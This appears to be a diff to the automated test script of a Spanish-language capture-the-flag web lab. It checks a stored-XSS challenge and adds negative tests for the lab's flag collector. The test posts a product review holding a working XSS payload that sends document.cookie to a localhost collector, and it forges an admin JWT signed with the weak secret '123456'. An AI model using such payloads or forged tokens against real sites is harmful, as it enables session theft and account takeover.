@@ -95,23 +95,43 @@ async function runTests() {
   // ==========================================
   // CH3: Stored XSS
   // ==========================================
-  console.log('\nTesting CH3: Stored XSS...');
-  // 1. Post the XSS
-  await request('POST', '/api/products/1/reviews', {
-    content: '<img src=x onerror="fetch(\'/api/ctf/collector?c=\'+document.cookie)">',
-    rating: 5
-  }, userToken);
-  // Wait a bit for the headless bot to trigger it (since it's async)
-  await new Promise(r => setTimeout(r, 2000));
-  
-  // To verify the flag in the automated test, we just call the collector directly
-  // like the XSS payload would, and grab the flag from the response.
-  const ch3 = await request('GET', '/api/ctf/collector?c=admin-token-super-secreto-12345');
-  if (ch3.data?.flag) {
-    flags.stored_xss = ch3.data.flag;
-    console.log('✅ Got CH3 Flag:', ch3.data.flag);
+    console.log('\nTesting CH3: Stored XSS...');
+  if (process.env.SKIP_BOT_TEST === '1') {
+    console.log('SKIPPED');
   } else {
-    console.error('❌ CH3 Failed:', ch3.data);
+    // Post the XSS
+    await request('POST', '/api/products/1/reviews', {
+      content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=\"+document.cookie)'>",
+      rating: 5
+    }, userToken);
+
+    // Wait up to 20s for the SOC alert
+    let exfilFlag = null;
+    const io = require('socket.io-client');
+    const socket = io('http://localhost:3000');
+    
+    await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => {
+        socket.disconnect();
+        reject(new Error('El bot no se ejecutó: ¿npx playwright install chromium?'));
+      }, 20000);
+
+      socket.on('http-log', (log) => {
+        if (log.threats && log.threats.some(t => t.tag === 'Exfiltration') && log.responseFlag) {
+          clearTimeout(timeout);
+          exfilFlag = log.responseFlag;
+          socket.disconnect();
+          resolve();
+        }
+      });
+    });
+
+    if (exfilFlag) {
+      flags.stored_xss = exfilFlag;
+      console.log('✅ Got CH3 Flag:', exfilFlag);
+    } else {
+      console.error('❌ CH3 Failed');
+    }
   }
 
   // ==========================================
@@ -223,6 +243,23 @@ async function runTests() {
     process.exit(1);
   }
 
+
+
+  console.log('\n--- VALIDATING COLLECTOR NEGATIVE TESTS ---');
+  try {
+    const neg1 = await request('GET', '/api/ctf/collector?c=admin');
+    if (neg1.data?.flag) throw new Error('Collector gave flag for c=admin');
+    
+    const jwt = require('jsonwebtoken');
+    const forged = jwt.sign({ role: 'admin' }, '123456');
+    const neg2 = await request('GET', `/api/ctf/collector?c=session=${forged}`);
+    if (neg2.data?.flag) throw new Error('Collector gave flag for forged JWT');
+    
+    console.log('✅ Collector negative tests passed');
+  } catch (err) {
+    console.error('❌ Negative tests failed:', err.message);
+    process.exit(1);
+  }
 
   console.log('\n--- VALIDATING SOC MAX_SEVERITY RANKING ---');
   // We'll test it by looking at the source code of socInterceptor.js
